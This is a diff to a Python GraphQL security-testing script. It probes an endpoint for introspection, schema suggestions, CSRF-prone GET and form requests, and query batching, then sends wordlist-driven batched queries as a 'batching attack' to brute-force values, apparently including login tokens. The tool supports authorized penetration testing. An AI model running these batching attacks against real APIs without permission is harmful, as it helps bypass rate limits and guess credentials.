@@ -14,10 +14,11 @@ parser.add_argument("-w", "--wordlist", help="Wordlist to be attempted via batch
 parser.add_argument('-H', "--header", action='append', nargs='+')
 parser.add_argument("-p", "--proxy", help="Proxy to use during request (localhost:8080).")
 parser.add_argument("-s", "--size", help="The total batch size, how many times the query will repeat.")
+parser.add_argument("-o", "--output", help="Output GraphQL responses to file.")
 args = parser.parse_args()
 
-if args.endpoint is None or args.query is None or args.wordlist is None or args.size is None:
-  print("Most provide endpoint, query, variable, wordlist, and batch size.")
+if args.endpoint is None:
+  print("Most provide endpoint.")
   sys.exit()
 
 # parse headers
@@ -128,31 +129,54 @@ try:
   if r.json().get("data"):
     print("Introspection request was successful.")
     introspection_query_success = True
-except:
-  print("Failed introspection query request.")
+except Exception as e:
+  print("Failed introspection query request. Exception: {}".format(e))
 
-# check if graphql api is providing suggestions
-suggestions_success = False
-suggestions_partial_success = False
-with open("1k-english.txt", "r") as english_words:
-  english_word_str = " ".join([word.strip() for word in english_words.readlines()])
-  suggestion_query = "query {{ {0} }}".format(english_word_str)
-  try:
-    r = requests.post(args.endpoint, headers=header_dict, json=dict(query=suggestion_query), proxies=proxies, verify=False)
-    if r.json().get("errors"):
-      for error in r.json()["errors"]:
-        if "Did you mean" in error["message"]:
-          suggestions_success = True
-        elif "Cannot query field" in error["message"]:
-          suggestions_partial_success = True
-    if suggestions_success:
-      print("Schema suggestions enabled. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance")
-    if suggestions_success == False and suggestions_partial_success == True:
-      print("Schema suggestions MAY be possible. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance")
-    if suggestions_success == False and suggestions_partial_success == False:
-      print("Schema suggestions don't seem to be enabled for this GraphQL API.")
-  except:
-    print("Failed to confirm if schema suggestions are enabled.")
+# check if graphql api is providing suggestions, only if introspection is not working
+if introspection_query_success == False:
+  suggestions_success = False
+  suggestions_partial_success = False
+  with open("1k-english.txt", "r") as english_words:
+    english_word_str = " ".join([word.strip() for word in english_words.readlines()])
+    suggestion_query = "query {{ {0} }}".format(english_word_str)
+    try:
+      r = requests.post(args.endpoint, headers=header_dict, json=dict(query=suggestion_query), proxies=proxies, verify=False)
+      if r.json().get("errors"):
+        for error in r.json()["errors"]:
+          if "Did you mean" in error["message"]:
+            suggestions_success = True
+          elif "Cannot query field" in error["message"]:
+            suggestions_partial_success = True
+      if suggestions_success:
+        print("Schema suggestions enabled. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance")
+      if suggestions_success == False and suggestions_partial_success == True:
+        print("Schema suggestions MAY be possible. Use Clairvoyance to recover schema: https://github.com/nikitastupin/clairvoyance")
+      if suggestions_success == False and suggestions_partial_success == False:
+        print("Schema suggestions don't seem to be enabled for this GraphQL API.")
+    except Exception as e:
+      print("Failed to confirm if schema suggestions are enabled. Exception: {}".format(e))
+
+# check if graphql API supports form encoded or GET based queries for CSRF detection
+csrf_get_based_success = False
+csrf_post_based_success = False
+try:
+  query_body = {"query": "query { a }"}
+  r = requests.get(args.endpoint, params=query_body, headers=header_dict, proxies=proxies, verify=False)
+  if r.json().get("errors"):
+    for error in r.json()["errors"]:
+      if "Cannot query field" in error["message"]:
+        csrf_get_based_success = True
+  r = requests.post(args.endpoint, data=query_body, headers=header_dict, proxies=proxies, verify=False)
+  if r.json().get("errors"):
+    for error in r.json()["errors"]:
+      if "Cannot query field" in error["message"]:
+        csrf_post_based_success = True
+  if csrf_get_based_success == True:
+    print("CSRF GET based successful. Please confirm that this is a valid issue.")
+  if csrf_post_based_success == True:
+    print("CSRF POST based successful. Please confirm that this is a valid issue.")
+except Exception as e:
+  print("Failed to perform CSRF checks. Exception: {}".format(e))
 
 # perform preflight requests to check for batching
 
@@ -166,8 +190,8 @@ try:
     if error_count > 1:
       print("Query name based batching: GraphQL batching is possible... preflight request was successful")
       double_query_success = True
-except:
-  print("Failed preflight request (query name based batching).")
+except Exception as e:
+  print("Failed preflight request (query name based batching). Exception: {}".format(e))
 
 # preflight #2 query JSON list based batching
 repeated_query_list = "query { assetnote: Query { hacktheplanet } }"
@@ -179,8 +203,8 @@ try:
   if error_count > 1:
     print("Query JSON list based batching: GraphQL batching is possible... preflight request was successful")
     repeated_query_success = True
-except:
-  print("Failed preflight request (query JSON list based batching).")
+except Exception as e:
+  print("Failed preflight request (query JSON list based batching). Exception: {}".format(e))
 
 # this tool doesnt currently support query name based batching
 # exit early and provide advice for hackers to exploit it using separate python script
@@ -192,43 +216,28 @@ if double_query_success == True and repeated_query_success == False:
 if args.preflight:
   sys.exit()
 
+if args.query is None or args.wordlist is None or args.size is None:
+  print("Most provide query, wordlist, and size to perform batching attack.")
+  sys.exit()
+
 # generate queries based off wordlist
-gql_list_dict = []
 with open(args.query, "r") as gql_query:
-    gql_str = gql_query.read()
+  gql_str = gql_query.read()
 
 with open(args.wordlist, "r") as wordlist:
-  for word in wordlist.readlines()[:int(args.size)]:
-    if not args.variable:
-      generated_query = gql_str.replace("#VARIABLE#", word.strip())
-      gql_list_dict.append({"query":generated_query})
-    else:
-      generated_variables = args.variable.replace("#VARIABLE#", word.strip())
-      gql_list_dict.append({"query": gql_str, "variables": json.loads(generated_variables)})
-
-for i in range(0, int(args.size)):
-  r = requests.post(args.endpoint, headers=header_dict, json=gql_list_dict, proxies=proxies, verify=False)
-  print(json.dumps(r.json(), indent=4, sort_keys=True))
-
-# for i in range(0, args.size):
-  # replace 
-
-# document = parse("""
-# mutation emailLoginRemembered($loginInput: InputRememberedEmailLogin!, $loginInputCorrect: InputRememberedEmailLogin!) {
-#   first: emailLoginRemembered(loginInput: $loginInput) {
-#     authToken {
-#       accessToken
-#       __typename
-#     } }
-#  second: emailLoginRemembered(loginInput: $loginInputCorrect) {
-#     authToken {
-#       accessToken
-#       __typename
-#     } }
-
-#     }
-
-# """)
-
-
-
+  wordlist_list = wordlist.readlines()
+  for i in range(0, len(wordlist_list), int(args.size)):
+    gql_list_dict = []
+    for word in wordlist_list[i:i+int(args.size)]:
+      if not args.variable:
+        generated_query = gql_str.replace("#VARIABLE#", word.strip())
+        gql_list_dict.append({"query":generated_query})
+      else:
+        generated_variables = args.variable.replace("#VARIABLE#", word.strip())
+        gql_list_dict.append({"query": gql_str, "variables": json.loads(generated_variables)})
+    attempt_str = "GraphQL Batch Attempt: {}".format(",".join([word.strip() for word in wordlist_list[i:i+int(args.size)]]))
+    print(attempt_str)
+    r = requests.post(args.endpoint, headers=header_dict, json=gql_list_dict, proxies=proxies, verify=False)
+    if args.output:
+      with open("output.txt", "a") as output_file:
+        output_file.write("{}: {}".format(attempt_str, r.json()))
